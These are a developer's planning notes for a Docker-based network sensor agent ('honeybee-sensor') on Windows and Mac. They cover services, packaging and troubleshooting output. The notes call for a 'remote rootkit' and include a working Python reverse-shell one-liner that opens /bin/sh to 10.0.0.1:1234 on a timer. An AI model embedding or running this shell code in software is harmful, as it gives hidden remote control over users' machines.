Software Agent

Must run on Windows and Mac. Not optional

Must set up infrastructure:
    PKI
    A reverse shell
    Basically a remote rootkit

docker-compose on windows and mac?

Windows and Mac scripts to manage the docker system?

Push everything possible into a docker image

How to do rpc?
    Are Docker hostnames visible to other images on the same Docker network? YES!!!!
    Each service gets a hardcoded hostname

How to package?
    Installing docker
    Installing our images and docker-compose
    Host service that monitors the docker images
    Updating the images
    Code signing/certification for each platform

Windows Service:
    http://thepythoncorner.com/dev/how-to-create-a-windows-service-in-python/

Linux Service:
    systemd

Mac Service:

https://docs.docker.com/docker-for-windows/install/
https://docs.docker.com/docker-for-mac/install/

Enable features from an install script in windows?
    https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/enable-or-disable-windows-features-using-dism
    Microsoft-Windows-Subsystem-Linux

Windows Installer:
    "Beginning with Windows Installer 5.0, a package can be authored to secure new accounts, Windows Services, files, folders, and registry keys. The package can specify a security descriptor that denies permissions, specifies inheritance of permissions from a parent resource, or specifies the permissions of a new account. "
    https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal

Service depends on Docker service

OnStart:
    Check for updates
    Start docker-compose

OnStop:
    Stop docker-compose

The system specific code should be limited to controlling the docker service and docker-compose

Control the host service from docker? Dangerous because attackers could potentially hack a docker image and then control the host

Reverse shell:
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("10.0.0.1",1234));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);

    Need a timer to call it

docker-compose up -d

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe C:\Users\leena\honeybee-sensor\windows\service\HoneybeeService\HoneybeeService\bin\Debug\HoneybeeService.exe

Need to properly parse the output from docker-compose

checking configurations ...
zeek scripts failed.
error in /opt/zeek/share/zeek/site/local.zeek, line 4: unrecognized character -
fatal error in /opt/zeek/share/zeek/site/local.zeek, line 6: can't find misc/loaded-scripts

Exiting: error loading config file: config file ("/etc/filebeat/filebeat.yml") can only be writable by the owner but the permissions are "-rwxrwxrwx" (to fix the permissions use: 'chmod go-w /etc/filebeat/filebeat.yml')
   ...fail!
2020-07-12T22:12:33.498Z        INFO    instance/beat.go:647    Home path: [/usr/share/filebeat] Config path: [/etc/filebeat] Data path: [/var/lib/filebeat] Logs path: [/var/log/filebeat]
2020-07-12T22:12:33.595Z        INFO    instance/beat.go:655    Beat ID: 7f7aac7d-bc9e-4952-9887-14279065ddd0

Still having issues with dos and unix new lines and the permissions on the filebeat.yml